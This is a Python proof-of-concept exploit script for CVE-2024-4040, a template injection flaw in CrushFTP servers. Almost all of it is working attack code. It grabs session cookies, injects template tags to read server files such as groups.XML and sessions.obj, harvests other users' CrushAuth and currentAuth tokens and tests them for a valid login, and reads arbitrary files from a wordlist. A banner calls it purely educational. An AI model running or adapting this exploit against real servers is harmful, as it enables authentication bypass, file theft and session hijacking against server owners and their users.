import requests
import argparse
import re
import urllib3
import xml.etree.ElementTree as ET
from rich.console import Console
from rich.progress import Progress
from rich.style import Style
from rich.text import Text
from urllib.parse import urlparse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


violet = Style(color="bright_magenta")
green = Style(color="green")
red = Style(color="red")
yellow = Style(color="yellow")
grellow = Style(color="yellow2")
cyan = Style(color="cyan")
brightcyan = Style(color="bright_cyan")
urlblue = Style(color="blue1") 
console = Console(highlight=False)


def banner():

    print("""

 ______     ______     __  __     ______     __  __     ______     _____    
/\  ___\   /\  == \   /\ \/\ \   /\  ___\   /\ \_\ \   /\  ___\   /\  __-.  
\ \ \____  \ \  __<   \ \ \_\ \  \ \___  \  \ \  __ \  \ \  __\   \ \ \/\ \ 
 \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\  \ \_\ \_\  \ \_____\  \ \____- 
  \/_____/   \/_/ /_/   \/_____/   \/_____/   \/_/\/_/   \/_____/   \/____/ 
                                                                            


    """)
    console.print(Text("CrushFTP SSTI PoC (CVE-2024-4040)", style=cyan))
    console.print(Text("Developer: @stuub", style=violet))
    console.print(Text("Purely for ethical & educational purposes only\n", style=yellow))

def serverSessionAJAX(target, session):

    console.print(f"[green][*][/green] Attempting to reach ServerSessionAJAX...\n")

    url = f"{target}/WebInterface/"

    try:
        response = session.get(url, verify=False, allow_redirects=True)

        if response.status_code == 404:
            console.print(f"[green][+][/green] Successfully reached ServerSessionAJAX")
            if 'CrushAuth' in response.cookies and 'currentAuth' in response.cookies:
                crush_auth_cookie = response.cookies['CrushAuth']
                current_auth_cookie = response.cookies['currentAuth']
                console.print(f"[green][+][/green] CrushAuth Session token: " + crush_auth_cookie)
                console.print(f"[green][+][/green] Current Auth Session token: " + current_auth_cookie)
                return crush_auth_cookie, current_auth_cookie
            else:
                console.print(f"[red][-][/red] 'CrushAuth' or 'currentAuth' cookie not found in the response")
                exit(1)

    except requests.exceptions.RequestException as e:
        console.print(f"[red][-][/red] Failed to reach ServerSessionAJAX")
        console.print(f"[red][-][/red] Error: " + str(e))
        exit(1)

def SSTI(target, crush_auth_cookie, current_auth_cookie, session):

    console.print(f"\n[green][*][/green] Attempting to exploit SSTI vulnerability...")

    url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path={{hostname}}&names=/a"
    console.print("\n[green][+][/green] URL: [urlblue]{}[/urlblue]".format(url))

    headers = {
        "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
    }

    try:
        response = session.post(url, headers=headers, verify=False, allow_redirects=True)

        if response.status_code == 200 and "{hostname}" not in response.text:
            console.print(f"[green][+][/green] Successfully exploited SSTI vulnerability")
            root = ET.fromstring(response.text)
            response_text = root.find('response').text
            console.print(f"[green][+][/green] Response: " + response_text)
        
        else:
            console.print(f"[red][-][/red] SSTI was not successful, server is not vulnerable.")
            console.print(f"[red][-][/red] Response: " + response.text)
            exit(1)

    except requests.exceptions.RequestException as e:
        console.print(f"[red][-][/red] Failed to exploit SSTI vulnerability")
        console.print(f"[red][-][/red] Error: " + str(e))
        exit(1)
    
    users = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>users/MainUsers/groups.XML</INCLUDE>&names=/a"
    console.print(f"\n[green][+][/green] Attempting to extract users/MainUsers/groups.XML...")
    console.print(f"\n[green][+][/green] URL: " + users)

    try:
        response = session.post(users, headers=headers, verify=False, allow_redirects=True)

        if response.status_code == 200 and response.text != "":
            console.print(f"[green][+][/green] Successfully extracted users/MainUsers/groups.XML")
            console.print(f"[green][+][/green] Extracted response: \n" + response.text)

        else:
            console.print(f"[red][-][/red] Failed to extract users/MainUsers/groups.XML")
            exit(1)
    except requests.exceptions.RequestException as e:
        console.print(f"[red][-][/red] Failed to extract users/MainUsers/groups.XML")
        console.print(f"[red][-][/red] Error: " + str(e))
        exit(1)

def authBypass(target, crush_auth_cookie, current_auth_cookie, session, lfi=None):
    
        console.print(f"[green][*][/green] Attempting to bypass authentication...")
    
        url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path={{working_dir}}&names=/a"
        console.print(f"\n[green][+][/green] URL: " + url)
        headers = {
            "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
        }
    
        try:
            response = session.post(url, headers=headers, verify=False, allow_redirects=True)
        
            if "{working_dir}" in response.text:
                console.print(f"[red][-][/red] Bypass was not successful, server is not vulnerable.")
                console.print(f"[red][-][/red] Response: " + response.text)
                exit(1)

            if response.status_code == 200 and response.text != "":
                console.print(f"[green][+][/green] Extracted response: \n" + response.text)

                root = ET.fromstring(response.text)
                response_text = root.find('response').text
                matches = re.findall(r'file:(.*?)(?=\n|$)', response_text)            
                if matches:
                    install_dir = matches[-1].strip()
                    console.print(f"[green][+][/green] Installation directory of CrushFTP: " + install_dir)
                    file_to_read = lfi if lfi else f"{install_dir}sessions.obj"
                    console.print(f"[green][+][/green] File to read: " + file_to_read)
                    
                    url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>{file_to_read}</INCLUDE>&names=/a"
                    console.print(f"\n[green][+][/green] Attempting to extract {file_to_read}...")
                    console.print(f"\n[green][+][/green] URL: " + url)
                    response = session.post(url, headers=headers, verify=False, allow_redirects=True)

                    if response.status_code == 200 and response.text != "":
                        console.print(f"[green][+][/green] Successfully extracted {file_to_read}")
                        escaped_text = response.text.replace("[", "\\[").replace("]", "\\]")

                        console.print(f"[green][+][/green] Extracted response: \n" + escaped_text)
                        if not lfi or lfi == f"{install_dir}sessions.obj":
                            extracted_crush_auth = [cookie[:44] for cookie in re.findall(r'CrushAuth=([^;]*)', response.text)]
                            extracted_current_auth = [cookie[:4] for cookie in re.findall(r'currentAuth=([^;]*)', response.text)]

                            console.print(f"\n[green][+][/green] Extracted cookies from {file_to_read}: ")
                            console.print(f"\n[green][+][/green] [yellow2]CrushAuth cookies:[/yellow2] " + ', '.join(extracted_crush_auth))
                            console.print(f"\n[green][+][/green] [yellow2]currentAuth cookies: [/yellow2]" + ', '.join(extracted_current_auth))
                            with open (f"sessions.obj", "w") as f:
                                f.write(response.text)
                            return extracted_crush_auth, extracted_current_auth
                    return None, None
                else:
                    print(f"[red][-][/red] Failed to extract file value")
                    return None
                
        except requests.exceptions.RequestException as e:
            console.print(f"[red][-][/red] Failed to bypass authentication")
            console.print(f"[red][-][/red] Error: " + str(e))
            exit(1)

def lfi_wordlist(target, crush_auth_cookie, current_auth_cookie, wordlist,session):

    console = Console()
    with open(wordlist, 'r') as f:
        files = [line.strip() for line in f]

    with Progress(console=console) as progress:
        task = progress.add_task("[bright_cyan]Processing wordlist...[/bright_cyan]", total=len(files))

        for file in files:
            if progress.finished: break

            console.print(f"\n[green][*][/green] [cyan]Attempting to read file:[/cyan] {file}")

            url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>{file}</INCLUDE>&names=/a"
            headers = {
                "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
            }

            try:
                response = session.post(url, headers=headers, verify=False, allow_redirects=True)

                if response.status_code == 200:
                    console.print(f"[green][+][/green] Successfully read file: {file}")
                    console.print(f"[green][+][/green] Response: \n" + response.text)

                progress.update(task, advance=1)
                
            except requests.exceptions.RequestException as e:
                console.print(f"[red][-][/red] Failed to read file: {file}")
                console.print(f"[red][-][/red] Error: " + str(e))

def test_tokens(target, crush_auth_cookie, current_auth_cookie, session):
    console = Console()

    if isinstance(crush_auth_cookie, str):
        crush_auth_cookie = crush_auth_cookie.split(', ')
    if isinstance(current_auth_cookie, str):
        current_auth_cookie = current_auth_cookie.split(', ')

    for crush_auth_token, current_auth_token in zip(crush_auth_cookie, current_auth_cookie):
        url = f"{target}/WebInterface/function?command=getUsername&c2f={current_auth_token}"
        headers = {
            "Cookie": f"CrushAuth={crush_auth_token}; currentAuth={current_auth_token}"
        }
        
        console.print(f"\n[green][+][/green] Testing tokens: CrushAuth={crush_auth_token}, currentAuth={current_auth_token}")
        try:
            response = session.post(url, headers=headers, verify=False, allow_redirects=True)

            if response.status_code == 200:
                console.print(f"[green][+][/green] Response: " + response.text)
            
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Failed to test tokens: CrushAuth={crush_auth_token}, currentAuth={current_auth_token}[/red]")
            console.print(f"[red]Error: " + str(e) + "[/red]")

def main():
    parser = argparse.ArgumentParser(description="CrushFTP SSTI PoC (CVE-2024-4040)")
    parser.add_argument("-t", "--target", help="Target CrushFTP URL", required=True)
    parser.add_argument("-l", "--lfi", help="Local File Inclusion")
    parser.add_argument("-w", "--wordlist", help="Wordlist for LFI")
    args = parser.parse_args()
    parsed_url = urlparse(args.target)
    stripped_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    args.target = stripped_url
    banner()

    global session
    session = requests.Session()
    
    console.print(f"\n[green][*][/green] Attempting to retrieve CrushAuth and currentAuth tokens...")
    auth_tokens = serverSessionAJAX(target=args.target, session=session)

    if auth_tokens is None:
        console.print(f"[red][-][/red] Failed to retrieve CrushAuth and currentAuth tokens.")
        exit(1)
    crush_auth_cookie, current_auth_cookie = auth_tokens


    SSTI(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, session=session)
    extracted_crush_auth, extracted_current_auth = authBypass(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, lfi=args.lfi, session=session)
    if args.wordlist:
        lfi_wordlist(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, wordlist=args.wordlist, session=session)
    if not args.lfi or args.lfi == 'sessions.obj':
        test_tokens(target=args.target, crush_auth_cookie=extracted_crush_auth, current_auth_cookie=extracted_current_auth, session=session)

if __name__ == "__main__":
    main()